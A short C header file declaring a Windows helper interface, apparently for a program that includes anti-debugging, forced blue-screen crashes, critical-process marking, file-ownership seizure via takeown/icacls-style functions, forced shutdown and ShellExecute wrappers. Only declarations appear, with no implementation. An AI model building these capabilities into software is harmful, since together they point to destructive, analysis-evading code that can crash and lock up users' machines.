#pragma once
#include "001.h"

typedef enum _SHUTDOWN_ACTION
{
	ShutdownNoReboot,
	ShutdownReboot,
	ShutdownPowerOff
} SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;

typedef struct tagWIN_VERSION_INFO
{
	unsigned int Major;
	unsigned int Minor;
	unsigned int BuildNum;
} WIN_VERSION_INFO, *PWIN_VERSION_INFO;

BOOL _001 GetWinVersion( WIN_VERSION_INFO* info );
void _001 AntiDebug( );
BOOL _001 Shutdown( unsigned int ShutdownOption, DWORD Force );
BOOL _001 Poweroff( SHUTDOWN_ACTION shutdownOption );
BOOL _001 BSOD( int error_code );
BOOL _001 SetProcessCritical( BOOLEAN Critical );
void _001 TakeOwn( WCHAR* Path );
void _001 Icacls( WCHAR* Path, WCHAR* Owner );
BOOL _001 _001_CopyFile( _In_ LPCWSTR lpExistingFileName, _In_ LPCWSTR lpNewFileName, _In_ BOOL bFailIfExists );
HINSTANCE _001 _001_ShellExecute( _In_opt_ HWND hwnd, _In_opt_ LPCWSTR lpOperation, _In_ LPCWSTR lpFile, _In_opt_ LPCWSTR lpParameters, _In_opt_ LPCWSTR lpDirectory, _In_ INT nShowCmd );